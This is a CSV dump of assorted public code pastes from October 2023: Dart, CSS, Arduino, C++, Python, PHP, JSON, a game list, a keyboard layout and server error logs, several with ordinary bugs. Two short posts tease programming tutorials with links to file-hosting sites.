id,title,username,language,date,content
FD9xidNy,Untitled,traue,Dart,Monday 2nd of October 2023 06:49:04 PM CDT,"import 'package:flutter/material.dart';

class Home extends StatefulWidget {
  const Home({Key? key}) : super(key: key);

  @override
  State<Home> createState() => _HomeState();
}

class _HomeState extends State<Home> {

  final List<String> cidades = [
    'Aracaju',
    'Belém',
    'Belo Horizonte',
    'Boa Vista',
    'Brasilia',
    'Campo Grande',
    'Cuiaba'
    'Curitiba',
    'Florianópolis',
    'Fortaleza',
    'Goiania',
    'João Pessoa',
    'Macapá',
    'Maceió',
    'Manaus',
    'Natal',
    'Palmas',
    'Porto Alegre',
    'Porto Velho',
    'Recife',
    'Rio Branco',
    'Rio de Janeiro',
    'Salvador',
    'São Luís',
    'São Paulo',
    'Teresina',
    'Vitória'
  ];

  @override
  Widget build(BuildContext context) {
    return Container();
  }
}
"
gyXzAgJJ,Jojo's Steel Ball Run,anaodia7,CSS,Monday 2nd of October 2023 06:44:01 PM CDT,"/*Usar por cima do Yotsuba Blue*/

html{
    background-image:url(""https://i.ibb.co/RHDnCxL/jjbg.png"");
    background-repeat: inherit;
    background-size: cover;
    background-attachment: fixed;
}

body{
    background: rgba(254, 168, 24, 0.5) !important;
    color:#000;
    font-family:arial,helvetica,sans-serif;
    font-size:10pt;
}

a{
  color: #186efe;
text-shadow: black 1px 1px 1px;
}

.options_tab_icon.active, .options_tab_icon:hover{
  color: gold;
}

a:hover{
  color: green;
text-shadow: black 1px 1px 1px;
}

form table tr th, #options_div, #alert_div, div.pages, .theme-catalog div.grid-size-small{
  color: gold;
  background: #186efe;
  border: dotted blue 2px;
}

.boardlist{
  background: #186efe !important;
  color: gold !important;
  border-bottom: dotted blue 2px !important;
}

.boardlist a{
  color: #A2C5FE !important;
}

.boardlist a:hover{
  color: green !important;
}

div.post.reply{
  border: dotted blue 2px;
  background: #74A8FE;
}

.intro span.name{
  color: gold !important;
text-shadow: black 1px 1px 1px;
}
 
div.post.reply.highlighted{
    background: magenta;
    border: #FFF 2px dashed !important;
  color: #FFF;
}

div.post.reply:hover{
    background: #392c20;
    border: green 2px dashed !important;
  color: green;
}

/*banner shit*/
img.banner, img.board_image {
    display: block;
 
/*added linkcde*/
    content:url('https://i.ibb.co/HKsBNd5/1500jojo.png');
    border: 2px dashed gold;
  margin-top: 40px !important;
}
 
 
a.quick-reply-btn{
  visibility: hidden !important;
visibility: collapse !important;
}
 
textarea#body{
   width: 295px;
   height: 92px;
}
 
.dropzone-wrap{
  width: 295px !important;
}

h1, h2, h3, h4, div.ban h2{
  color: gold !important;
}"
7kaMnZQq,PythonOperators,sissou123,Python,Monday 2nd of October 2023 06:30:14 PM CDT,"PythonOperators

 In Python programming, Operators in general are used to perform operations on values and variables. These are standard symbols used for the ...
for more:
https://www.gulf-up.com/6o28gdg90h1z


"
sMn1ms3s,Haloween Automation,learnelectronics,Arduino,Monday 2nd of October 2023 06:20:55 PM CDT,"/********************************************************
 *  Arduino Foundation Series: Automatic Jackolantern   *
 *              Learnelectronics Oct. 2023 (C)         *
 *       https://www.youtube.com/learnelectronics       *
 ********************************************************/
// Define constants for pin numbers
const int inputPin = 2; // The input pin to monitor
const int ledPin1 = 5;  // First LED pin
const int ledPin2 = 6;  // Second LED pin


// Variables to track LED state and timing
bool ledState1 = LOW;   // Initial LED state for LED 1
bool ledState2 = LOW;   // Initial LED state for LED 2
unsigned long previousMillis = 0; // Stores the last time LEDs were toggled
const long interval = 1000; // Interval for the 1-second duty cycle (in milliseconds)



void setup() {
  pinMode(inputPin, INPUT); // Set the input pin as INPUT
  pinMode(ledPin1, OUTPUT); // Set the LED pins as OUTPUT
  pinMode(ledPin2, OUTPUT);
  pinMode(3,OUTPUT);
}

void loop() {
  // Read the state of the input pin
  int buttonState = digitalRead(inputPin);
  
  // Check if the input pin is HIGH (button pressed)
  if (buttonState == HIGH) {
    unsigned long currentMillis = millis(); // Get the current time
    
    // Check if it's time to toggle the LEDs
    if (currentMillis - previousMillis >= interval) {
      // Save the current time
      previousMillis = currentMillis;
      
      // Toggle the state of both LEDs
      ledState1 = !ledState1;
      ledState2 = !ledState2;
      
      // Set the LEDs to their new states
      digitalWrite(ledPin1, ledState1);
      digitalWrite(ledPin2, ledState2);

      for (int i = 200; i <= 400; i++) {
    tone(3, i);
    delay(11);
  }
    noTone(3);  
    }
  } else {
    // If the input pin is LOW (button not pressed), turn off both LEDs
    digitalWrite(ledPin1, LOW);
    digitalWrite(ledPin2, LOW);
  }
}"
DcDb4YQw,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 06:10:02 PM CDT,"class RecentCounter {

private:

vector<int> Pings;

int IDX = 0;

public:
    
    RecentCounter() { 
        Pings.resize(3001);
    }

    int ping(int t) {
        
        Pings[IDX%3000] = t;

        int Ans = 0;

        if(IDX / 3000 > 0){
            Ans += Pings.end() - lower_bound(Pings.begin() + IDX%3000, Pings.end(), t - 3000)  + 1;
            Ans += lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) - Pings.begin()  + 1;
        }else{
            
             Ans = (Pings.begin() + IDX%3000) - lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) + 1;
        }

        ++IDX;
        return Ans;


    }
};
/*
 1, 2, 3, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
 3021, 3022, 4343, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
*/
/**
 * Your RecentCounter object will be instantiated and called as such:
 * RecentCounter* obj = new RecentCounter();
 * int param_1 = obj->ping(t);
 */"
vW1rQ4kV,Untitled,sissou123,Python,Monday 2nd of October 2023 06:09:03 PM CDT,"DSA: Recursion with Python
Recursion is an important concept in computer programming. It allows us to create a function that calls itself. A good knowledge of recursion will help us understand the overall concept of data structures and algorithms more effectively.

Learn Recursion with Python will help you learn the concept of recursion from the very basics level with images, examples and challenges.
for more: https://www.file-upload.org/wsfqy1bq1ktp"
wsqWSM6B,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 06:07:15 PM CDT,"class RecentCounter {

private:

vector<int> Pings;

int IDX = 0;

public:
    
    RecentCounter() { 
        Pings.resize(3000);
    }

    int ping(int t) {
        
        Pings[IDX%3000] = t;

        int Ans = 0;

        if(IDX / 3000 > 0){
            Ans += Pings.end() - lower_bound(Pings.begin() + IDX%3000, Pings.end(), t - 3000);
            Ans += lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) - Pings.begin();
        }else{
            
             Ans = (Pings.begin() + IDX%3000) - lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) + 1;
        }

        ++IDX;
        return Ans;


    }
};
/*
 1, 2, 3, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
 3021, 3022, 4343, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
*/
/**
 * Your RecentCounter object will be instantiated and called as such:
 * RecentCounter* obj = new RecentCounter();
 * int param_1 = obj->ping(t);
 */"
22mbaXpB,Untitled,thehunmonkgroup,Python,Monday 2nd of October 2023 06:06:57 PM CDT,"import asyncio
import aio_pika
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
from queue import Queue

class Resource:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.executor = ThreadPoolExecutor(max_workers=1)
        self.connection = None
        self.channel = None
        self.queue = Queue()

    def start(self):
        Thread(target=self.loop_in_thread, args=(self.loop,)).start()

    def loop_in_thread(self, loop):
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.connect())
        loop.run_forever()

    async def connect(self):
        self.connection = await aio_pika.connect_robust(""amqp://guest:guest@localhost/"", loop=self.loop)
        self.channel = await self.connection.channel()
        queue = await self.channel.declare_queue('test_queue')
        await queue.consume(self.on_message)

    async def on_message(self, message):
        async with message.process():
            self.queue.put(message.body)

    def process_messages(self):
        while not self.queue.empty():
            message = self.queue.get()
            print(message)
            # Process the message here

    def stop(self):
        self.loop.call_soon_threadsafe(self.loop.stop)

if __name__ == ""__main__"":
    resource = Resource()
    resource.start()
    try:
        while True:
            resource.process_messages()
    except KeyboardInterrupt:
        resource.stop()"
uprFvj0V,Untitled,Zlatas863,PHP,Monday 2nd of October 2023 06:06:14 PM CDT,"<?php
// prní metoda
function LoadClass($class) {
  $subdir = ""classes/"";
  require_once($subdir . $classFile);
}
spl_autoload_register(""LoadClass"");

// druhá metoda
$subdir = ""classes/"";
$dir = opendir($subdir);
while ($file = readdir($dir)){
	if (pathinfo($file, PATHINFO_EXTENSION) == ""php""){
	require_once($subdir . $file);
}
closedir($dir);
?>"
5QwevFVv,"[review_form_url post_id=""""]",geminilabs,PHP,Monday 2nd of October 2023 05:44:20 PM CDT,"/**
 * Registers the [review_form_url post_id=""""] shortcode
 */
add_shortcode('review_form_url', function ($atts) {
	$atts = shortcode_atts(['post_id' => 0], $atts);
	$postId = (int) $atts['post_id'];
	return add_query_arg('assigned_post', get_the_ID(), get_permalink($postId));
});"
Pzjaty22,Counter,zwenboy,Lua,Monday 2nd of October 2023 05:18:42 PM CDT,"local ascii = [[ _   _ _   _  ____  ____ _____ _____ ____  
| \ | | | | |/ ___|/ ___| ____|_   _/ ___| 
|  \| | | | | |  _| |  _|  _|   | | \___ \ 
| |\  | |_| | |_| | |_| | |___  | |  ___) |
|_| \_|\___/ \____|\____|_____| |_| |____/ 
  ___   ___   ___   ___   ___   ___   ___  
 / _ \ / _ \ / _ \ / _ \ / _ \ / _ \ / _ \ 
| | | | | | | | | | | | | | | | | | | | | |
| |_| | |_| | |_| | |_| | |_| | |_| | |_| |
 \___/ \___/ \___/ \___/ \___/ \___/ \___/ 
]]
print(ascii)"
KeEi7dkF,MOK layout Aljamiado,dksetiavan,YAML,Monday 2nd of October 2023 05:13:07 PM CDT,"{
""title"":""Aljamiado"",
""onScreen"":{
""main"":[
""١٢٣٤٥٦٧٨٩٠"",
""قو[MC:َا]رتيَُِ[MC:بّ]"",
""اشدفغهسكل"",
""[SHIFT]ز[MC:شّ][MC:جّ]ْبنم[DEL]"",
""[TOOL][ALTGR:،][SPACE][][][SYM:.][ENTER]""
],

""shifted"":[
""﷽ﷻﷺﷸﷷﷶﷵﷴﷳﷲ"",
""خوأ[MC:رّ]طئًٌٍث"",
""ءصذـعحجكل"",
""[SHIFT]ةضظّب[MC:نّ]م[DEL]"",
""[LOCK][ALTGR:‍][SPACE][][][SYM:‌][ENTER]""
],

""sym"":[
""!@#$۞٪&*)(۝"",
""]}{\/_-=|+۩["",
""~؎﷼£¥€:؛'ʺ٭"",
""[SHIFT]؟…؏؞«»,.?[DEL]"",
""[LOCK][ALTGR:‍][SPACE][][][SYM:‌][ENTER]""
],

""altGr"":[
""1234567890"",
"">‎‏‭‮‬‪‫ <"",
""°•ىـ−ٱۤ،﴾﴿;"",
""[SHIFT]ٰٖٜٗ؍٫٬‐۔[DEL]"",
""[LOCK][ALTGR:,][SPACE][][][SYM:.][ENTER]""
]}}
    "
ptXwYewr,Big games com remoteplay,iZoOrD,HTML,Monday 2nd of October 2023 05:04:37 PM CDT,"Lista de jogos fodas atualizados by wisla quebra kanela 

1º Jogo do pato: https://store.steampowered.com/app/837470/Untitled_Goose_Game/
2º Dysmantle, apocalipse loko: https://store.steampowered.com/app/846770/DYSMANTLE/
3º Unravel Two, Jogo de trabalhar a massa cefalica: https://store.steampowered.com/app/1225570/Unravel_Two/
4º Unravel, msm coisa: https://store.steampowered.com/app/1225560/Unravel/
5º Moving Out, jogo de fazer mudança: https://store.steampowered.com/app/996770/Moving_Out/
6º Ship of Fools, é tipo sea of thieves soq 2d e full matar bixo(esse tem coop online tmb): https://store.steampowered.com/app/1286580/Ship_of_Fools/
7º Spelunky 2, melhor jogo do mundo igual o primeiro mas ngm joga bando de merdolas: https://store.steampowered.com/app/418530/Spelunky_2/
8º Spelunky, melhor jogo do ano quem discordar é gay: https://store.steampowered.com/app/239350/Spelunky/
9º Se mova ou morra(tmb tem online): https://store.steampowered.com/app/323850/Move_or_Die/

A SEGUIR TEM A SERIE DE TERROR THE DARK PICTURES JÁ Q O KRA CURTE UM TERRORZIN INTERATIVO

10º Primeiro jogo da série: https://store.steampowered.com/app/939850/The_Dark_Pictures_Anthology_Man_of_Medan/
11º Segundo jogo da série: https://store.steampowered.com/app/1194630/The_Dark_Pictures_Anthology_Little_Hope/
12º Terceiro jogo da série: https://store.steampowered.com/app/1281590/The_Dark_Pictures_Anthology_House_of_Ashes/
13º Quarto jogo da série(esse tem friend pass então se tu comprar da pra jogar online mas dizem q n funciona mt bem): https://store.steampowered.com/app/1567020/The_Dark_Pictures_Anthology_The_Devil_in_Me/

VOLTAMOS A PROGRAMAÇÃO NORMAL

14º Reforma de casas: https://store.steampowered.com/app/1004490/Tools_Up/
Simulador de lenhador loko: https://store.steampowered.com/app/976900/Lumberhill/
15º Esse aqui tu pode acabar com as festas alheias(matando geral)https://store.steampowered.com/app/572430/Party_Hard_2/
16º Nesse aqui nois tem que gerenciar uma rede de espaçonave: https://store.steampowered.com/app/1412850/Spacelines_from_the_Far_Out/
17º rinha de galinha: https://store.steampowered.com/app/1194250/Screaming_Chicken_Ultimate_Showdown/
18º joguinho de mago pra juntar as magia e zaralhar os bixo: https://store.steampowered.com/app/238370/Magicka_2/
19º esse aqui eh o 1: https://store.steampowered.com/app/42910/Magicka/
20º esse tu ja tem(historinhas): https://store.steampowered.com/app/960990/Beyond_Two_Souls/
21º desarmar bombas fodas: https://store.steampowered.com/app/341800/Keep_Talking_and_Nobody_Explodes/
22º tu ta no espaço e tem que tentar n cair no void(esse eh hard) https://store.steampowered.com/app/1138850/Heavenly_Bodies/
23º Franquia Trine, tu ja deve ter todos(todos tem coop): https://store.steampowered.com/bundle/12292/Trineverse/
Trine 5(por algum motivo eh separado): https://store.steampowered.com/app/1436700/Trine_5_A_Clockwork_Conspiracy/
Briga de bolo: https://store.steampowered.com/app/971690/Cake_Bash/
24º simulador de trabaio: https://store.steampowered.com/app/2131350/My_Coworker_is_an_Idiot/
25º n eh camundongo nem preá, tu guia um rato e tem q furtar: https://store.steampowered.com/app/1951230/Pizza_Possum/"
ArQLMtsy,LSD_v2,Korotkodul,C++,Monday 2nd of October 2023 04:37:25 PM CDT,"#include <cmath>
#include <iostream>
#include <vector>

using std::cin;
using std::cout;
using std::max;
using std::min;
using std::string;
using std::vector;
using Ll = long long;

const int k20 = 20;
const int k10 = 10;
int len;
vector<Ll> ar;
vector<int> less_than;
vector<Ll> hlp;

int Digit(Ll num, int par) {
  Ll mod = pow(k10, par + 1);
  Ll div = pow(k10, par);
  return num % mod / div;
}

void PrecountLessThan(int par) {
  less_than.assign(k10, 0);
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    less_than[dig]++;
  }
}

void CountLessThan() {
  int cnt = 0;
  for (int id = 0; id < k10; ++id) {
    int point = less_than[id];
    less_than[id] = cnt;
    cnt += point;
  }
}

void LSD(int par) {
  PrecountLessThan(par);
  CountLessThan();
  // sort непосредственно по par-й цифре с конца
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    hlp[less_than[dig]] = ar[id];
    less_than[dig]++;
  }
  ar = hlp;
}

int main() {
  /*std::ios::sync_with_stdio(false);
  std::cin.tie(0);
  std::cout.tie(0);*/
  cin >> len;
  ar.resize(len);
  hlp.resize(len);
  for (Ll& el : ar) {
    cin >> el;
  }
  // sort-им по каждой цифре с конца (В long long  не более 20ти цифр)
  for (int par = 0; par < k20; ++par) {
    LSD(par);
  }
  for (Ll el : ar) {
    cout << el << ""\n"";
  }
}
"
WHB3nkzn,Untitled,anechka_ne_plach,Python,Monday 2nd of October 2023 04:05:36 PM CDT,"        bin_1_val = np.repeat(np.arange(0, a_max + 1)[None, :], (a_max - a_min + 1), axis=0)
        bin_1_ns = np.arange(a_min, a_max + 1)
        bin_1_ps = np.full_like(np.zeros((a_max - a_min + 1, 1)), p1)
        bin_1_prob = binom.pmf(bin_1_val, bin_1_ns[:, None], bin_1_ps)

        bin_2_val = np.repeat(np.arange(0, b_max + 1)[None, :], (b_max - b_min + 1), axis=0)
        bin_2_ns = np.arange(b_min, b_max + 1)
        bin_2_ps = np.full_like(np.zeros((b_max - b_min + 1, 1)), p2)
        bin_2_prob = binom.pmf(bin_2_val, bin_2_ns[:, None], bin_2_ps)

        c_probs = scipy.signal.convolve(bin_1_prob[:, :, None], bin_2_prob[:, None, :])"
rvyV8bNw,Untitled,sanya5791,JSON,Monday 2nd of October 2023 03:48:09 PM CDT,"{
  ""filterCountWithShowMore"": 3,
  ""allFilterOptionsCount"": 1,
  ""maxPrice"": 300,
  ""starRatings"": [
    {
      ""id"": ""3.0"",
      ""label"": ""3+ Star Level""
    },
    {
      ""id"": ""4.0"",
      ""label"": ""4+ Star Level""
    },
    {
      ""id"": ""5.0"",
      ""label"": ""5+ Star Level""
    }
  ],
  ""guestScore"": [
    {
      ""id"": ""7.0"",
      ""label"": ""7.0+""
    },
    {
      ""id"": ""8.0"",
      ""label"": ""8.0+""
    },
    {
      ""id"": ""9.0"",
      ""label"": ""9.0+""
    }
  ],
  ""amenities"": [
    {
      ""id"": ""FREE_CANCELLATION"",
      ""label"": ""Free Cancellation""
    },
    {
      ""id"": ""FINTRNT"",
      ""label"": ""Free Internet""
    },
    {
      ""id"": ""FBRKFST"",
      ""label"": ""Free Breakfast""
    },
    {
      ""id"": ""FPRKING"",
      ""label"": ""Free Parking""
    },
    {
      ""id"": ""FITSPA"",
      ""label"": ""Fitness Center""
    },
    {
      ""id"": ""SPOOL"",
      ""label"": ""Swimming Pool""
    },
    {
      ""id"": ""AIRSHUTTL"",
      ""label"": ""Airport Shuttle""
    },
    {
      ""id"": ""FAIRSHUTTL"",
      ""label"": ""Free Airport Shuttle""
    },
    {
      ""id"": ""BUSCNTR"",
      ""label"": ""Business Center""
    },
    {
      ""id"": ""CASINO"",
      ""label"": ""Casino""
    },
    {
      ""id"": ""PETALLOW"",
      ""label"": ""Pets Allowed""
    },
    {
      ""id"": ""RESTRNT"",
      ""label"": ""Restaurant""
    },
    {
      ""id"": ""HANDFAC"",
      ""label"": ""Handicapped Rooms/Facilities""
    },
    {
      ""id"": ""NSMKFAC"",
      ""label"": ""No Smoking Rooms/Facilities""
    },
    {
      ""id"": ""SPA"",
      ""label"": ""Spa""
    }
  ],
  ""propertyType"": [
    {
      ""id"": ""204"",
      ""label"": ""Hotels""
    },
    {
      ""id"": ""201"",
      ""label"": ""Apartments""
    },
    {
      ""id"": ""208"",
      ""label"": ""Bed &amp; Breakfast""
    },
    {
      ""id"": ""203"",
      ""label"": ""Hostels""
    },
    {
      ""id"": ""205"",
      ""label"": ""Motels""
    },
    {
      ""id"": ""206"",
      ""label"": ""Resorts""
    },
    {
      ""id"": ""213"",
      ""label"": ""Villas""
    },
    {
      ""id"": ""216"",
      ""label"": ""Guest Houses""
    },
    {
      ""id"": ""218"",
      ""label"": ""Inns""
    },
    {
      ""id"": ""219"",
      ""label"": ""Aparthotels""
    },
    {
      ""id"": ""220"",
      ""label"": ""Holiday Homes""
    },
    {
      ""id"": ""501"",
      ""label"": ""Casinos""
    }
  ],
  ""quickFilters"": {
    ""allHotels"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ],
      ""pricebreakers"": true
    },
    ""expressDeals"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ]
    }
  }
}"
mcXYzgki,Untitled,sanya5791,JSON,Monday 2nd of October 2023 03:44:11 PM CDT,"{
  ""filterCountWithShowMore"": 3,
  ""allFilterOptionsCount"": 1,
  ""maxPrice"": 300,
  ""starRatings"": [
    {
      ""id"": ""3.0"",
      ""label"": ""3+ Star Level""
    },
    {
      ""id"": ""4.0"",
      ""label"": ""4+ Star Level""
    },
    {
      ""id"": ""5.0"",
      ""label"": ""5+ Star Level""
    }
  ],
  ""guestScore"": [
    {
      ""id"": ""7.0"",
      ""label"": ""7.0+""
    },
    {
      ""id"": ""8.0"",
      ""label"": ""8.0+""
    },
    {
      ""id"": ""9.0"",
      ""label"": ""9.0+""
    }
  ],
  ""amenities"": [
    {
      ""id"": ""FREE_CANCELLATION"",
      ""label"": ""Free Cancellation""
    },
    {
      ""id"": ""FINTRNT"",
      ""label"": ""Free Internet""
    },
    {
      ""id"": ""FBRKFST"",
      ""label"": ""Free Breakfast""
    },
    {
      ""id"": ""FPRKING"",
      ""label"": ""Free Parking""
    },
    {
      ""id"": ""FITSPA"",
      ""label"": ""Fitness Center""
    },
    {
      ""id"": ""SPOOL"",
      ""label"": ""Swimming Pool""
    },
    {
      ""id"": ""AIRSHUTTL"",
      ""label"": ""Airport Shuttle""
    },
    {
      ""id"": ""FAIRSHUTTL"",
      ""label"": ""Free Airport Shuttle""
    },
    {
      ""id"": ""BUSCNTR"",
      ""label"": ""Business Center""
    },
    {
      ""id"": ""CASINO"",
      ""label"": ""Casino""
    },
    {
      ""id"": ""PETALLOW"",
      ""label"": ""Pets Allowed""
    },
    {
      ""id"": ""RESTRNT"",
      ""label"": ""Restaurant""
    },
    {
      ""id"": ""HANDFAC"",
      ""label"": ""Handicapped Rooms/Facilities""
    },
    {
      ""id"": ""NSMKFAC"",
      ""label"": ""No Smoking Rooms/Facilities""
    },
    {
      ""id"": ""SPA"",
      ""label"": ""Spa""
    }
  ],
  ""propertyType"": [
    {
      ""id"": ""204"",
      ""label"": ""Hotels""
    },
    {
      ""id"": ""201"",
      ""label"": ""Apartments""
    },
    {
      ""id"": ""208"",
      ""label"": ""Bed &amp; Breakfast""
    },
    {
      ""id"": ""203"",
      ""label"": ""Hostels""
    },
    {
      ""id"": ""205"",
      ""label"": ""Motels""
    },
    {
      ""id"": ""206"",
      ""label"": ""Resorts""
    },
    {
      ""id"": ""213"",
      ""label"": ""Villas""
    },
    {
      ""id"": ""216"",
      ""label"": ""Guest Houses""
    },
    {
      ""id"": ""218"",
      ""label"": ""Inns""
    },
    {
      ""id"": ""219"",
      ""label"": ""Aparthotels""
    },
    {
      ""id"": ""220"",
      ""label"": ""Holiday Homes""
    },
    {
      ""id"": ""501"",
      ""label"": ""Casinos""
    }
  ],
  ""quickFilters"": {
    ""allHotels"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ],
      ""pricebreakers"": true
    }""expressDeals"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ]
    }
  }
}"
KV3DBV85,Untitled,possebon,PHP,Monday 2nd of October 2023 03:17:50 PM CDT,"2023-10-02 16:50:59.346 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:50:59.350 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:78
2023-10-02 16:50:59.351 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:50:59.351 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
INFO:     10.108.0.4:40352 - ""GET /api/v1/spots/78 HTTP/1.0"" 200 OK
2023-10-02 16:50:59.357 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:78
2023-10-02 16:50:59.357 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:78
2023-10-02 16:50:59.358 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
INFO:     10.108.0.4:40372 - ""GET /api/v1/spots/78 HTTP/1.0"" 200 OK
2023-10-02 16:50:59.362 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:70
INFO:     10.108.0.4:40368 - ""GET /api/v1/spots/78 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40382 - ""GET /api/v1/spots/70 HTTP/1.0"" 200 OK
2023-10-02 16:50:59.541 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:50:59.547 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:70
INFO:     10.108.0.4:40398 - ""GET /api/v1/spots/70 HTTP/1.0"" 200 OK
2023-10-02 16:51:00.789 | DEBUG    | app.api.api_v1.endpoints.building:search_buildings:44 - entity=BUILDING | method=GET | route=/buildings/{keyword} | returncode=000 | message=Route_Called
INFO:     10.108.0.4:40414 - ""GET /api/v1/buildings/?max_results=10 HTTP/1.0"" 500 Internal Server Error
ERROR:    Exception in ASGI application
Traceback (most recent call last):
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/protocols/http/h11_impl.py"", line 407, in run_asgi
    result = await app(  # type: ignore[func-returns-value]
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/middleware/proxy_headers.py"", line 78, in __call__
    return await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/applications.py"", line 269, in __call__
    await super().__call__(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/applications.py"", line 124, in __call__
    await self.middleware_stack(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 184, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 162, in __call__
    await self.app(scope, receive, _send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 84, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 93, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 82, in __call__
    await self.app(scope, receive, sender)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 21, in __call__
    raise e
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 18, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 670, in __call__
    await route.handle(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 266, in handle
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 65, in app
    response = await func(request)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 227, in app
    raw_response = await run_endpoint_function(
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 162, in run_endpoint_function
    return await run_in_threadpool(dependant.call, **values)
  File ""/usr/local/lib/python3.8/site-packages/starlette/concurrency.py"", line 41, in run_in_threadpool
    return await anyio.to_thread.run_sync(func, *args)
  File ""/usr/local/lib/python3.8/site-packages/anyio/to_thread.py"", line 33, in run_sync
    return await get_async_backend().run_sync_in_worker_thread(
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 2106, in run_sync_in_worker_thread
    return await future
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 833, in run
    result = context.run(func, *args)
  File ""/app/api/api_v1/endpoints/building.py"", line 56, in search_buildings
    buildings = crud.building.get_multi(db=db, limit=max_results, offset=offset)
TypeError: get_multi() got an unexpected keyword argument 'offset'
INFO:     10.108.0.4:40726 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40742 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40756 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 16:51:19.703 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:51:19.709 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:40768 - ""GET /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40780 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40784 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 16:51:19.901 | DEBUG    | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:245 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=000 | message=Route_Called
2023-10-02 16:51:19.906 | SUCCESS  | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:275 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:40814 - ""GET /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
